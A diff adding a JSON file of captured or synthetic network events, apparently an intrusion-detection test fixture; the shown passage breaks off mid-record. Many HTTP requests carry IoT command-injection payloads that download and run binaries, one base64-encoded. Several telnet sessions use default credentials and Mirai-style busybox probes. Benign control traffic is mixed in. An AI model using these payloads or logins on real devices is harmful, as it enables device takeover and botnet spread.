@@ -1,0 +1,1398 @@
+{
+  "events": [
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /cgi-bin/luci/;stok=6b31d9a2/locale?form=country HTTP/1.1\r\nHost: branch-gw01.corp.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 183\r\n\r\noperation=write&country=US;cd%20%2Ftmp%3Bcurl%20-fsS%20http%3A%2F%2Fimage-store.ops.local%2Fcache%2Fupdate.bin%20-o%20.ntpd%3Bchmod%20755%20.ntpd%3B.%2F.ntpd&timezone=America/New_York",
+          "response": "HTTP/1.1 403 Forbidden\r\nServer: GoAhead-Webs\r\nDate: Tue, 07 Apr 2026 14:00:32 GMT\r\nContent-Type: text/html\r\nContent-Length: 35\r\nConnection: close\r\n\r\n<html><body>Forbidden</body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 32001,
+        "src_ip": "100.83.14.17",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.10"
+      },
+      "id": 2001,
+      "timestamp": "2026-04-07T14:00:00.000000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /cgi-bin/luci/;stok=7719a1ee/locale?form=country HTTP/1.1\r\nHost: branch-gw01.corp.local\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 326\r\n\r\noperation=write&country=US;cd%20%2Ftmp%2F.ICE-unix%3B%28curl%20-fsS%20http%3A%2F%2Fupdates-cache.corp.local%2Fr%2Fstage%20-o%20.logd%7C%7Cwget%20http%3A%2F%2Fupdates-cache.corp.local%2Fr%2Fstage%20-O%20.logd%7C%7Ctftp%20-g%20-r%20stage%20updates-cache.corp.local%29%3Bchmod%20%2Bx%20.logd%3B.%2F.logd&timezone=America/New_York",
+          "response": "HTTP/1.1 404 Not Found\r\nServer: Router WebServer\r\nDate: Tue, 07 Apr 2026 14:00:46 GMT\r\nContent-Type: text/html\r\nContent-Length: 35\r\nConnection: close\r\n\r\n<html><body>Not Found</body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 32002,
+        "src_ip": "100.83.14.21",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.10"
+      },
+      "id": 2002,
+      "timestamp": "2026-04-07T14:00:07.137000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /cgi-bin/luci/;stok=6b31d9a2/locale?form=country HTTP/1.1\r\nHost: branch-gw01.corp.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 54\r\n\r\noperation=write&country=US&timezone=America%2FNew_York",
+          "response": "HTTP/1.1 302 Found\r\nServer: lighttpd/1.4.59\r\nDate: Tue, 07 Apr 2026 14:01:13 GMT\r\nLocation: /index.asp\r\nContent-Type: text/html\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 35011,
+        "src_ip": "10.17.4.25",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.10"
+      },
+      "id": 2011,
+      "timestamp": "2026-04-07T14:00:57.096000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /tmUnblock.cgi HTTP/1.1\r\nHost: branch-gw02.corp.local:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 179\r\n\r\nsubmit_button=Ping&ttcp_ip=127.0.0.1;cd%20%2Ftmp%3Bcurl%20-fsS%20http%3A%2F%2F172.22.14.88%2Fcache%2Fupdate.bin%20-o%20.udhcpc%3Bchmod%20755%20.udhcpc%3B.%2F.udhcpc&change_action=",
+          "response": "HTTP/1.1 500 Internal Server Error\r\nServer: App-webs/\r\nDate: Tue, 07 Apr 2026 14:01:24 GMT\r\nContent-Type: text/html\r\nContent-Length: 38\r\nConnection: close\r\n\r\n<html><body>Server Error</body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 32021,
+        "src_ip": "100.83.14.21",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 8080,
+        "dst_ip": "172.20.8.11"
+      },
+      "id": 2021,
+      "timestamp": "2026-04-07T14:01:24.909000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /tmUnblock.cgi HTTP/1.1\r\nHost: branch-gw02.corp.local:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Safari/605.1.15\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 238\r\n\r\nsubmit_button=Ping&ttcp_ip=127.0.0.1%24%28echo%20Y2QgL3RtcC8uSUNFLXVuaXg7L2Jpbi9idXN5Ym94IHdnZXQgaHR0cDovL3VwZGF0ZXMtY2FjaGUuY29ycC5sb2NhbC9wa2cvaW1nIC1PIC5udHBkO2NobW9kIDc1NSAubnRwZDtzaCAubnRwZA%3D%3D%7Cbase64%20-d%7Csh%29&change_action=",
+          "response": "HTTP/1.1 302 Found\r\nServer: lighttpd/1.4.59\r\nDate: Tue, 07 Apr 2026 14:01:53 GMT\r\nLocation: /index.asp\r\nContent-Type: text/html\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 32023,
+        "src_ip": "100.83.14.77",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 8080,
+        "dst_ip": "172.20.8.11"
+      },
+      "id": 2023,
+      "timestamp": "2026-04-07T14:01:39.183000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /tmUnblock.cgi HTTP/1.1\r\nHost: branch-gw02.corp.local:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 47\r\n\r\nsubmit_button=Ping&ttcp_ip=8.8.8.8&action=Apply",
+          "response": "HTTP/1.1 403 Forbidden\r\nServer: GoAhead-Webs\r\nDate: Tue, 07 Apr 2026 14:02:49 GMT\r\nContent-Type: text/html\r\nContent-Length: 35\r\nConnection: close\r\n\r\n<html><body>Forbidden</body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 35031,
+        "src_ip": "10.17.4.31",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 8080,
+        "dst_ip": "172.20.8.11"
+      },
+      "id": 2031,
+      "timestamp": "2026-04-07T14:02:22.005000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "PUT /SDK/webLanguage HTTP/1.1\r\nHost: camera-31.iot.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nContent-Type: application/xml\r\nContent-Length: 156\r\n\r\n<?xml version=\"1.0\"?><language>en;cd /tmp;curl -fsS http://updates-cache.corp.local/cache/update.bin -o .watchdog;chmod 755 .watchdog;./.watchdog</language>",
+          "response": "HTTP/1.1 302 Found\r\nServer: lighttpd/1.4.59\r\nDate: Tue, 07 Apr 2026 14:03:00 GMT\r\nLocation: /index.asp\r\nContent-Type: text/html\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 32041,
+        "src_ip": "100.83.14.44",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "10.17.20.31"
+      },
+      "id": 2041,
+      "timestamp": "2026-04-07T14:02:49.818000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "PUT /SDK/webLanguage HTTP/1.1\r\nHost: camera-31.iot.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nContent-Type: application/xml\r\nContent-Length: 47\r\n\r\n<?xml version=\"1.0\"?><language>en-US</language>",
+          "response": "HTTP/1.1 500 Internal Server Error\r\nServer: App-webs/\r\nDate: Tue, 07 Apr 2026 14:04:24 GMT\r\nContent-Type: text/html\r\nContent-Length: 38\r\nConnection: close\r\n\r\n<html><body>Server Error</body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 35051,
+        "src_ip": "10.17.4.48",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "10.17.20.31"
+      },
+      "id": 2051,
+      "timestamp": "2026-04-07T14:03:46.914000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /apply.cgi HTTP/1.1\r\nHost: ot-router03.plant.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 233\r\n\r\nsubmit_type=adjust_sys_time&change_action=gozila_cgi&adj_time_year=2026;cd%20%2Ftmp%3Bcurl%20-fsS%20http%3A%2F%2Fcdn-relay.branch.lan%2Fcache%2Fupdate.bin%20-o%20.logd%3Bchmod%20755%20.logd%3B.%2F.logd&adj_time_mon=04&adj_time_day=07",
+          "response": "HTTP/1.1 403 Forbidden\r\nServer: GoAhead-Webs\r\nDate: Tue, 07 Apr 2026 14:04:36 GMT\r\nContent-Type: text/html\r\nContent-Length: 35\r\nConnection: close\r\n\r\n<html><body>Forbidden</body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 32061,
+        "src_ip": "100.83.14.77",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.12"
+      },
+      "id": 2061,
+      "timestamp": "2026-04-07T14:04:14.727000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /apply.cgi HTTP/1.1\r\nHost: ot-router03.plant.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 103\r\n\r\nsubmit_type=adjust_sys_time&change_action=gozila_cgi&adj_time_year=2026&adj_time_mon=04&adj_time_day=07",
+          "response": "HTTP/1.1 302 Found\r\nServer: lighttpd/1.4.59\r\nDate: Tue, 07 Apr 2026 14:05:17 GMT\r\nLocation: /index.asp\r\nContent-Type: text/html\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 35071,
+        "src_ip": "10.17.4.60",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.12"
+      },
+      "id": 2071,
+      "timestamp": "2026-04-07T14:05:11.823000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "POST /Interface/DevManage/VM.php HTTP/1.1\r\nHost: video-nvr02.iot.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 206\r\n\r\nmethod=setNatConfig&natAddress=192.168.1.10&natPort=8080;cd%20%2Ftmp%3Bcurl%20-fsS%20http%3A%2F%2Frepo-sync.corp.local%2Fcache%2Fupdate.bin%20-o%20.cache%3Bchmod%20755%20.cache%3B.%2F.cache&natServerPort=80",
+          "response": "HTTP/1.1 500 Internal Server Error\r\nServer: App-webs/\r\nDate: Tue, 07 Apr 2026 14:06:12 GMT\r\nContent-Type: text/html\r\nContent-Length: 38\r\nConnection: close\r\n\r\n<html><body>Server Error</body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 32081,
+        "src_ip": "100.83.14.82",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "10.17.20.45"
+      },
+      "id": 2081,
+      "timestamp": "2026-04-07T14:05:39.636000Z"
+    },
+    {
+      "scenario_id": 9001,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "GET / HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nConnection: keep-alive\r\nHost: portal.branch.lan\r\nUser-Agent: python-requests/2.31.0\r\n\r\n",
+          "response": null
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 48000,
+        "src_ip": "100.83.14.17",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "rst",
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.20"
+      },
+      "id": 3001,
+      "timestamp": "2026-04-07T14:50:00.000000Z"
+    },
+    {
+      "scenario_id": 9001,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "GET / HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nConnection: keep-alive\r\nHost: portal.branch.lan\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0\r\n\r\n",
+          "response": "HTTP/1.1 503 Service Unavailable\r\nServer: GoAhead-Webs\r\nDate: Tue, 07 Apr 2026 14:50:06 GMT\r\nContent-Type: text/html\r\nContent-Length: 72\r\nConnection: close\r\n\r\n<html><body><h1>Server Error</h1><p>Invalid parameter.</p></body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 48001,
+        "src_ip": "100.83.14.21",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.20"
+      },
+      "id": 3002,
+      "timestamp": "2026-04-07T14:50:00.180000Z"
+    },
+    {
+      "scenario_id": 9001,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "GET / HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nConnection: keep-alive\r\nHost: portal.branch.lan\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Safari/605.1.15\r\n\r\n",
+          "response": "HTTP/1.1 429 Too Many Requests\r\nServer: RouterWebServer\r\nDate: Tue, 07 Apr 2026 14:50:09 GMT\r\nContent-Type: text/html\r\nContent-Length: 84\r\nConnection: close\r\n\r\n<html><head><title>Device</title></head><body><div>Settings page</div></body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 48002,
+        "src_ip": "100.83.14.44",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.20"
+      },
+      "id": 3003,
+      "timestamp": "2026-04-07T14:50:00.360000Z"
+    },
+    {
+      "scenario_id": 9001,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "GET / HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nConnection: keep-alive\r\nHost: portal.branch.lan\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Safari/605.1.15\r\n\r\n",
+          "response": null
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 48003,
+        "src_ip": "100.83.14.77",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "rst",
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.20"
+      },
+      "id": 3004,
+      "timestamp": "2026-04-07T14:50:00.540000Z"
+    },
+    {
+      "scenario_id": 9001,
+      "protocol": "http",
+      "protocol_data": [
+        {
+          "request": "GET / HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\nConnection: keep-alive\r\nHost: portal.branch.lan\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0\r\n\r\n",
+          "response": "HTTP/1.1 500 Internal Server Error\r\nServer: Boa/0.94.14rc21\r\nDate: Tue, 07 Apr 2026 14:50:15 GMT\r\nContent-Type: text/html\r\nContent-Length: 72\r\nConnection: close\r\n\r\n<html><body><h1>Server Error</h1><p>Invalid parameter.</p></body></html>"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 48004,
+        "src_ip": "100.83.14.82",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 80,
+        "dst_ip": "172.20.8.20"
+      },
+      "id": 3005,
+      "timestamp": "2026-04-07T14:50:00.720000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "telnet",
+      "protocol_data": [
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "login: "
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "root"
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "Password: "
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "xc3511"
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "BusyBox v1.31.1\n# "
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "enable"
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "enable\r\n# "
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "sh"
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "sh\r\n# "
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "/bin/busybox DVRHELP"
+        },
+        {
+          "sender_ip": "100.83.14.17",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "/bin/busybox DVRHELP\r\n# "
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 41000,
+        "src_ip": "100.83.14.17",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 2323,
+        "dst_ip": "172.20.8.10"
+      },
+      "id": 1001,
+      "timestamp": "2026-04-07T14:32:00.000000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "telnet",
+      "protocol_data": [
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "login: "
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "admin"
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "Password: "
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "admin"
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "BusyBox v1.19.4 built-in shell (ash)\n# "
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "enable"
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "enable\r\n# "
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "sh"
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "sh\r\n# "
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "/bin/busybox AKUMA"
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "/bin/busybox AKUMA\r\n# "
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "cat /proc/cpuinfo"
+        },
+        {
+          "sender_ip": "100.83.14.21",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "cat /proc/cpuinfo\r\n# "
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 41001,
+        "src_ip": "100.83.14.21",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 23,
+        "dst_ip": "172.20.8.11"
+      },
+      "id": 1002,
+      "timestamp": "2026-04-07T14:32:11.000000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "telnet",
+      "protocol_data": [
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "login: "
+        },
+        {
+          "sender_ip": "10.17.4.25",
+          "payload": "admin"
+        },
+        {
+          "sender_ip": "10.17.4.25",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "Password: "
+        },
+        {
+          "sender_ip": "10.17.4.25",
+          "payload": "wrongpass"
+        },
+        {
+          "sender_ip": "10.17.4.25",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.10",
+          "payload": "Login incorrect\nlogin: "
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 44000,
+        "src_ip": "10.17.4.25",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 2323,
+        "dst_ip": "172.20.8.10"
+      },
+      "id": 1036,
+      "timestamp": "2026-04-07T14:40:00.000000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "telnet",
+      "protocol_data": [
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "Username: "
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "admin"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "Password: "
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "********"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "Router> "
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "enable"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "172.20.8.11",
+          "payload": "Router# "
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "show version"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "show interfaces"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "\r\n"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "exit"
+        },
+        {
+          "sender_ip": "10.17.4.31",
+          "payload": "\r\n"
+        }
+      ],
+      "tcp_ip": {
+        "src_port": 44001,
+        "src_ip": "10.17.4.31",
+        "tcp_flag_flow": [
+          [
+            "syn"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "psh",
+            "ack"
+          ],
+          [
+            "fin",
+            "ack"
+          ],
+          [
+            "ack"
+          ]
+        ],
+        "dst_port": 23,
+        "dst_ip": "172.20.8.11"
+      },
+      "id": 1037,
+      "timestamp": "2026-04-07T14:40:13.000000Z"
+    },
+    {
+      "scenario_id": null,
+      "protocol": "telnet",
+      "protocol_data": [
+        {
+          "sender_ip": "10.17.20.45",
+          "payload": "Username: "
+        },
+        {
+          "sender_ip": "10.17.4.48",
+          "payload": "admin"
+        },
+        {
+          "sender_ip": "10.17.4.48",
